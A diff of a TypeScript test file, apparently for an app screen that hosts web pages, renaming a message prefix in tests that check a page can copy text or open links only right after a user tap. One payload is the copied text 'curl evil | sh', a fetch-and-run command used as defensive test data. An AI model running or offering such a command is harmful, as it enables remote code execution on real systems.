@@ -122,8 +122,8 @@ it("copies and opens links for a page only right after the person tapped it", as
     });
   const touch = (name: string, x: number, y: number, fingers?: number) =>
     host.touch[name]?.(at(x, y, fingers));
-  const copy = { type: "rakazo-page:copy", id: "a", text: "curl evil | sh" };
-  const link = { type: "rakazo-page:open-link", url: "https://example.com/x" };
+  const copy = { type: "labradoodle-page:copy", id: "a", text: "curl evil | sh" };
+  const link = { type: "labradoodle-page:open-link", url: "https://example.com/x" };
   const attempt = async () => {
     await send(copy);
     await send(link);
@@ -184,7 +184,7 @@ it("does not let a page that reloads right after a tap act on that tap", async (
   await act(async () => root.render(createElement(PageScreen)));
   const copy = () =>
     act(async () => {
-      host.message?.(JSON.stringify({ type: "rakazo-page:copy", id: "a", text: "x" }), () => {});
+      host.message?.(JSON.stringify({ type: "labradoodle-page:copy", id: "a", text: "x" }), () => {});
       await new Promise((resolve) => setTimeout(resolve, 0));
     });
   host.touch.onTouchStart?.(at(10, 10));
